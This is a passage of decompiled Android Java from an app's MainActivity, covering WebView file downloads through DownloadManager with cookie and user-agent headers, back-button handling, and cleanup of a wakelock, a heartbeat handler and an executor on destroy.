    /* JADX INFO: renamed from: lambda$setupWebView$20$com-love-app-MainActivity, reason: not valid java name */
    /* synthetic */ void m347lambda$setupWebView$20$comloveappMainActivity(String str, String str2, String str3, String str4, long j) {
        this.sUrl = str;
        this.sUserAgent = str2;
        this.sFileName = URLUtil.guessFileName(str, str3, getFileType(str));
        if (ContextCompat.checkSelfPermission(this, "android.permission.WRITE_EXTERNAL_STORAGE") == 0) {
            downloadFile(this.sFileName, str, str2);
        } else {
            ActivityCompat.requestPermissions(this, new String[]{"android.permission.WRITE_EXTERNAL_STORAGE"}, 105);
        }
    }

    private String getFileType(String str) {
        return MimeTypeMap.getSingleton().getExtensionFromMimeType(getContentResolver().getType(Uri.parse(str)));
    }

    private void downloadFile(String str, String str2, String str3) {
        try {
            String cookie = CookieManager.getInstance().getCookie(str2);
            DownloadManager downloadManager = (DownloadManager) getSystemService("download");
            DownloadManager.Request request = new DownloadManager.Request(Uri.parse(str2));
            request.setTitle(str).setDescription("Downloading...").addRequestHeader("cookie", cookie).addRequestHeader(ANConstants.USER_AGENT, str3).setAllowedOverMetered(true).setAllowedOverRoaming(true).setNotificationVisibility(1).setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, str);
            downloadManager.enqueue(request);
            Toast.makeText(this, "Download Started", 0).show();
        } catch (Exception unused) {
            Toast.makeText(this, "Download failed", 0).show();
        }
    }

    @Override // androidx.activity.ComponentActivity, android.app.Activity
    public void onBackPressed() {
        WebView webView = this.webView;
        if (webView == null || !webView.canGoBack()) {
            return;
        }
        this.webView.goBack();
    }

    @Override // androidx.appcompat.app.AppCompatActivity, androidx.fragment.app.FragmentActivity, android.app.Activity
    protected void onDestroy() {
        super.onDestroy();
        PowerManager.WakeLock wakeLock = this.wakeLock;
        if (wakeLock != null && wakeLock.isHeld()) {
            this.wakeLock.release();
        }
        Runnable runnable = this.heartbeatRunnable;
        if (runnable != null) {
            this.heartbeatHandler.removeCallbacks(runnable);
        }
        ExecutorService executorService = this.executor;
        if (executorService != null) {
            executorService.shutdownNow();
        }
    }
}
